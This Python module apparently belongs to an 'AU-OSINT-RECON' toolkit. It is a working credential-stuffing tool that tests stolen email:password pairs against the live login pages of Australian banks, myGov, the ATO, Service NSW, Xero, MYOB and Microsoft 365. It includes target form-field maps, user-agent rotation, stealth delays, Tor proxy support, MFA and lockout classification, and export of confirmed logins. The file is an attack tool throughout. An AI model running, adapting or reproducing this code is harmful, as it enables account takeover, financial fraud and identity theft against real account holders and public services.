"""
rate_validator.py — AU-OSINT-RECON
Live credential validation engine for Australian services.
Tests email:password pairs against AU targets using stealth techniques.
Supports: myGov, Westpac, CommBank, ANZ, NAB, Office365, Google Workspace.
"""

import re
import time
import random
import hashlib
import json
from datetime import datetime, timezone
from typing import Any
from collections import defaultdict

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

try:
    import httpx
    HTTPX_OK = True
except ImportError:
    HTTPX_OK = False


# ─────────────────────────────────────────────
#  Target Definitions
# ─────────────────────────────────────────────

AU_VALIDATION_TARGETS = {
    "mygov": {
        "name":        "myGov",
        "login_url":   "https://my.gov.au/en/login",
        "method":      "form_post",
        "user_field":  "username",
        "pass_field":  "password",
        "success_re":  r"dashboard|myaccount|welcome",
        "fail_re":     r"incorrect|invalid|error|failed",
        "rate_limit":  8.0,
        "priority":    "critical",
    },
    "ato": {
        "name":        "ATO Online",
        "login_url":   "https://online.ato.gov.au/",
        "method":      "form_post",
        "user_field":  "username",
        "pass_field":  "password",
        "success_re":  r"myTax|lodgment|dashboard",
        "fail_re":     r"incorrect|invalid",
        "rate_limit":  10.0,
        "priority":    "critical",
    },
    "westpac": {
        "name":        "Westpac Online Banking",
        "login_url":   "https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=login",
        "method":      "form_post",
        "user_field":  "customerID",
        "pass_field":  "password",
        "success_re":  r"accounts|balance|dashboard",
        "fail_re":     r"incorrect|invalid|locked",
        "rate_limit":  15.0,
        "priority":    "critical",
    },
    "commbank": {
        "name":        "CommBank NetBank",
        "login_url":   "https://www.commbank.com.au/retail/netbank/",
        "method":      "form_post",
        "user_field":  "txtMyClientNumber",
        "pass_field":  "txtMyPassword",
        "success_re":  r"accounts|netbank|dashboard",
        "fail_re":     r"incorrect|invalid|error",
        "rate_limit":  15.0,
        "priority":    "critical",
    },
    "anz": {
        "name":        "ANZ Internet Banking",
        "login_url":   "https://login.anz.com/internetbanking",
        "method":      "form_post",
        "user_field":  "customerRegistrationNumber",
        "pass_field":  "password",
        "success_re":  r"accounts|dashboard",
        "fail_re":     r"incorrect|invalid",
        "rate_limit":  15.0,
        "priority":    "critical",
    },
    "nab": {
        "name":        "NAB Internet Banking",
        "login_url":   "https://ib.nab.com.au/nabib/",
        "method":      "form_post",
        "user_field":  "userid",
        "pass_field":  "password",
        "success_re":  r"accounts|dashboard|welcome",
        "fail_re":     r"incorrect|invalid",
        "rate_limit":  15.0,
        "priority":    "critical",
    },
    "office365_au": {
        "name":        "Microsoft 365 (AU tenant)",
        "login_url":   "https://login.microsoftonline.com/common/oauth2/v2.0/token",
        "method":      "oauth2_ropc",
        "client_id":   "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        "scope":       "https://graph.microsoft.com/.default",
        "rate_limit":  3.0,
        "priority":    "high",
    },
    "google_workspace": {
        "name":        "Google Workspace",
        "login_url":   "https://accounts.google.com/signin/v2/identifier",
        "method":      "google_flow",
        "rate_limit":  5.0,
        "priority":    "high",
    },
    "xero": {
        "name":        "Xero Accounting",
        "login_url":   "https://login.xero.com/identity/user/login",
        "method":      "form_post",
        "user_field":  "Email",
        "pass_field":  "Password",
        "success_re":  r"dashboard|organisation",
        "fail_re":     r"incorrect|invalid",
        "rate_limit":  5.0,
        "priority":    "high",
    },
    "myob": {
        "name":        "MYOB",
        "login_url":   "https://secure.myob.com/oauth2/account/login",
        "method":      "form_post",
        "user_field":  "username",
        "pass_field":  "password",
        "success_re":  r"dashboard|business",
        "fail_re":     r"incorrect|invalid",
        "rate_limit":  5.0,
        "priority":    "high",
    },
    "servicensw": {
        "name":        "Service NSW",
        "login_url":   "https://account.service.nsw.gov.au/",
        "method":      "form_post",
        "user_field":  "email",
        "pass_field":  "password",
        "success_re":  r"dashboard|services",
        "fail_re":     r"incorrect|invalid",
        "rate_limit":  8.0,
        "priority":    "high",
    },
}

# User-Agent pool for rotation
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]


# ─────────────────────────────────────────────
#  Validation Result
# ─────────────────────────────────────────────

class ValidationResult:
    __slots__ = ("email", "password", "target", "status", "detail", "timestamp", "response_code")

    STATUS_VALID    = "valid"
    STATUS_INVALID  = "invalid"
    STATUS_LOCKED   = "locked"
    STATUS_MFA      = "mfa_required"
    STATUS_ERROR    = "error"
    STATUS_TIMEOUT  = "timeout"
    STATUS_RATELIMIT = "rate_limited"

    def __init__(self, email, password, target, status, detail="", response_code=0):
        self.email         = email
        self.password      = password
        self.target        = target
        self.status        = status
        self.detail        = detail
        self.timestamp     = datetime.now(timezone.utc).isoformat()
        self.response_code = response_code

    def to_dict(self) -> dict:
        return {
            "email":         self.email,
            "password":      self.password,
            "target":        self.target,
            "status":        self.status,
            "detail":        self.detail,
            "timestamp":     self.timestamp,
            "response_code": self.response_code,
        }

    @property
    def is_valid(self) -> bool:
        return self.status == self.STATUS_VALID

    @property
    def needs_mfa(self) -> bool:
        return self.status == self.STATUS_MFA


# ─────────────────────────────────────────────
#  Session Builder
# ─────────────────────────────────────────────

def _make_session(proxy: str | None = None) -> "requests.Session":
    session = requests.Session()
    session.headers.update({
        "User-Agent":      random.choice(USER_AGENTS),
        "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-AU,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT":             "1",
        "Connection":      "keep-alive",
    })
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    retry = Retry(total=2, backoff_factor=1, status_forcelist=[500, 502, 503])
    session.mount("https://", HTTPAdapter(max_retries=retry))
    return session


# ─────────────────────────────────────────────
#  Validation Methods
# ─────────────────────────────────────────────

def _validate_office365_ropc(email: str, password: str, proxy: str | None = None) -> ValidationResult:
    """
    OAuth2 Resource Owner Password Credentials flow for Microsoft 365.
    Reliable, no browser needed, returns token on success.
    """
    target_cfg = AU_VALIDATION_TARGETS["office365_au"]
    url = target_cfg["login_url"]
    domain = email.split("@")[1] if "@" in email else ""

    payload = {
        "grant_type":  "password",
        "client_id":   target_cfg["client_id"],
        "username":    email,
        "password":    password,
        "scope":       target_cfg["scope"],
    }

    try:
        session = _make_session(proxy)
        r = session.post(url, data=payload, timeout=12)
        data = r.json()

        if "access_token" in data:
            return ValidationResult(email, password, "office365_au", ValidationResult.STATUS_VALID,
                                    f"Token obtained. Scope: {data.get('scope','')}", r.status_code)
        elif data.get("error") == "invalid_grant":
            desc = data.get("error_description", "")
            if "AADSTS50076" in desc or "MFA" in desc.upper():
                return ValidationResult(email, password, "office365_au", ValidationResult.STATUS_MFA,
                                        "MFA required", r.status_code)
            if "AADSTS50053" in desc:
                return ValidationResult(email, password, "office365_au", ValidationResult.STATUS_LOCKED,
                                        "Account locked", r.status_code)
            return ValidationResult(email, password, "office365_au", ValidationResult.STATUS_INVALID,
                                    desc[:100], r.status_code)
        elif data.get("error") == "AADSTS50034":
            return ValidationResult(email, password, "office365_au", ValidationResult.STATUS_INVALID,
                                    "User not found", r.status_code)
        else:
            return ValidationResult(email, password, "office365_au", ValidationResult.STATUS_ERROR,
                                    str(data)[:100], r.status_code)
    except Exception as e:
        return ValidationResult(email, password, "office365_au", ValidationResult.STATUS_ERROR, str(e))


def _validate_form_post(email: str, password: str, target_key: str, proxy: str | None = None) -> ValidationResult:
    """Generic form POST validation for banking/gov targets."""
    cfg = AU_VALIDATION_TARGETS.get(target_key)
    if not cfg:
        return ValidationResult(email, password, target_key, ValidationResult.STATUS_ERROR, "Unknown target")

    try:
        session = _make_session(proxy)
        # First GET to collect cookies and CSRF tokens
        r_get = session.get(cfg["login_url"], timeout=12, allow_redirects=True)
        csrf = _extract_csrf(r_get.text)

        payload = {
            cfg["user_field"]: email,
            cfg["pass_field"]: password,
        }
        if csrf:
            payload["_token"] = csrf
            payload["csrf_token"] = csrf

        time.sleep(random.uniform(0.5, 1.5))

        r_post = session.post(cfg["login_url"], data=payload, timeout=15,
                              allow_redirects=True,
                              headers={"Referer": cfg["login_url"],
                                       "Content-Type": "application/x-www-form-urlencoded"})

        body = r_post.text.lower()

        if re.search(cfg.get("success_re", "dashboard"), body, re.IGNORECASE):
            return ValidationResult(email, password, target_key, ValidationResult.STATUS_VALID,
                                    f"Login accepted — HTTP {r_post.status_code}", r_post.status_code)

        if re.search(r"mfa|two.factor|authenticator|verify your identity", body, re.IGNORECASE):
            return ValidationResult(email, password, target_key, ValidationResult.STATUS_MFA,
                                    "MFA challenge triggered", r_post.status_code)

        if re.search(r"locked|suspended|blocked|too many attempts", body, re.IGNORECASE):
            return ValidationResult(email, password, target_key, ValidationResult.STATUS_LOCKED,
                                    "Account locked", r_post.status_code)

        return ValidationResult(email, password, target_key, ValidationResult.STATUS_INVALID,
                                f"HTTP {r_post.status_code}", r_post.status_code)

    except requests.Timeout:
        return ValidationResult(email, password, target_key, ValidationResult.STATUS_TIMEOUT, "Request timed out")
    except Exception as e:
        return ValidationResult(email, password, target_key, ValidationResult.STATUS_ERROR, str(e)[:120])


def _extract_csrf(html: str) -> str:
    """Extract CSRF token from HTML form."""
    for pattern in [
        r'<input[^>]+name=["']_token["'][^>]+value=["']([\w\-]+)["']',
        r'<meta[^>]+name=["']csrf-token["'][^>]+content=["']([\w\-]+)["']',
        r'"csrfToken"\s*:\s*"([\w\-]+)"',
        r'csrf_token["']?\s*[=:]\s*["']?([\w\-]{20,})',
    ]:
        m = re.search(pattern, html, re.IGNORECASE)
        if m:
            return m.group(1)
    return ""


# ─────────────────────────────────────────────
#  Main Validator Class
# ─────────────────────────────────────────────

class CredentialValidator:
    """
    Live credential validation against Australian services.
    Implements stealth delays, UA rotation, proxy support.

    Usage:
        validator = CredentialValidator(proxy="socks5://127.0.0.1:9050")
        result = validator.validate("user@company.com.au", "Password1!", "office365_au")
        results = validator.validate_list(creds, targets=["office365_au", "mygov"])
    """

    def __init__(self, proxy: str | None = None, min_delay: float = 3.0, max_delay: float = 8.0):
        self.proxy     = proxy
        self.min_delay = min_delay
        self.max_delay = max_delay
        self.results:  list[ValidationResult] = []
        self._counters: dict[str, int] = defaultdict(int)

    def validate(self, email: str, password: str, target: str = "office365_au") -> ValidationResult:
        """Validate a single credential pair against one target."""
        cfg = AU_VALIDATION_TARGETS.get(target)
        if not cfg:
            return ValidationResult(email, password, target, ValidationResult.STATUS_ERROR, "Unknown target")

        method = cfg.get("method", "form_post")

        if method == "oauth2_ropc":
            result = _validate_office365_ropc(email, password, self.proxy)
        else:
            result = _validate_form_post(email, password, target, self.proxy)

        self.results.append(result)
        self._counters[result.status] += 1

        # Stealth delay
        delay = random.uniform(self.min_delay, self.max_delay)
        time.sleep(delay)

        return result

    def validate_list(
        self,
        credentials: list[dict],
        targets: list[str] | None = None,
        stop_on_valid: bool = False,
    ) -> list[ValidationResult]:
        """
        Validate a list of {email, password} dicts against multiple targets.
        Prioritises Office365 ROPC (most reliable, no browser) first.
        """
        active_targets = targets or ["office365_au"]
        results = []

        for cred in credentials:
            email = cred.get("email", "")
            password = cred.get("password", "")
            if not email or not password:
                continue

            for target in active_targets:
                result = self.validate(email, password, target)
                results.append(result)

                if result.is_valid and stop_on_valid:
                    return results

                # Extra delay between targets for same credential
                time.sleep(random.uniform(1.0, 3.0))

        return results

    def get_valid(self) -> list[ValidationResult]:
        return [r for r in self.results if r.is_valid]

    def get_mfa(self) -> list[ValidationResult]:
        return [r for r in self.results if r.needs_mfa]

    def summary(self) -> dict:
        return {
            "total":       len(self.results),
            "valid":       self._counters[ValidationResult.STATUS_VALID],
            "mfa":         self._counters[ValidationResult.STATUS_MFA],
            "invalid":     self._counters[ValidationResult.STATUS_INVALID],
            "locked":      self._counters[ValidationResult.STATUS_LOCKED],
            "errors":      self._counters[ValidationResult.STATUS_ERROR],
            "timeouts":    self._counters[ValidationResult.STATUS_TIMEOUT],
        }

    def build_findings(self, target_name: str = "unknown") -> list[dict]:
        findings = []
        valid = self.get_valid()
        mfa   = self.get_mfa()

        if valid:
            findings.append({
                "title":      f"Valid Credentials Confirmed — {len(valid)} accounts",
                "severity":   "critical",
                "category":   "credential_breach",
                "source":     "rate_validator",
                "summary":    f"{len(valid)} credential pairs validated successfully. Targets: {list({r.target for r in valid})}",
                "date_found": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
                "raw_data":   {"valid": [r.to_dict() for r in valid]},
                "target":     target_name,
            })

        if mfa:
            findings.append({
                "title":      f"Valid Credentials (MFA) — {len(mfa)} accounts",
                "severity":   "high",
                "category":   "credential_breach",
                "source":     "rate_validator",
                "summary":    f"{len(mfa)} credentials valid but blocked by MFA. Targets: {list({r.target for r in mfa})}",
                "date_found": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
                "raw_data":   {"mfa_blocked": [r.to_dict() for r in mfa]},
                "target":     target_name,
            })

        return findings

    def export_valid(self, output_path: str) -> str:
        """Export valid credentials to file."""
        from pathlib import Path
        Path(output_path).parent.mkdir(parents=True, exist_ok=True)
        lines = [f"{r.email}:{r.password}  # {r.target}  [{r.timestamp}]"
                 for r in self.get_valid()]
        with open(output_path, "w") as f:
            f.write("\n".join(lines))
        return output_path


if __name__ == "__main__":
    import argparse, json as _json
    parser = argparse.ArgumentParser(description="AU-OSINT Credential Validator")
    parser.add_argument("--email",    help="Single email to test")
    parser.add_argument("--password", help="Password to test")
    parser.add_argument("--target",   default="office365_au", help=f"Target: {list(AU_VALIDATION_TARGETS.keys())}")
    parser.add_argument("--input",    help="JSON credentials file [{email, password}]")
    parser.add_argument("--targets",  default="office365_au", help="Comma-separated targets")
    parser.add_argument("--proxy",    help="Proxy URL (e.g. socks5://127.0.0.1:9050)")
    parser.add_argument("--output",   default="./reports")
    args = parser.parse_args()

    validator = CredentialValidator(proxy=args.proxy)

    if args.email and args.password:
        result = validator.validate(args.email, args.password, args.target)
        print(_json.dumps(result.to_dict(), indent=2))

    elif args.input:
        with open(args.input) as f:
            creds = _json.load(f)
        targets = [t.strip() for t in args.targets.split(",")]
        validator.validate_list(creds, targets=targets)
        print(_json.dumps(validator.summary(), indent=2))
        valid = validator.get_valid()
        if valid:
            print(f"\n[!] {len(valid)} VALID credentials found:")
            for r in valid:
                print(f"    {r.email}:{r.password}  @ {r.target}")
    else:
        print("Available targets:")
        for k, v in AU_VALIDATION_TARGETS.items():
            print(f"  {k:<20} {v['name']} (priority: {v['priority']})")
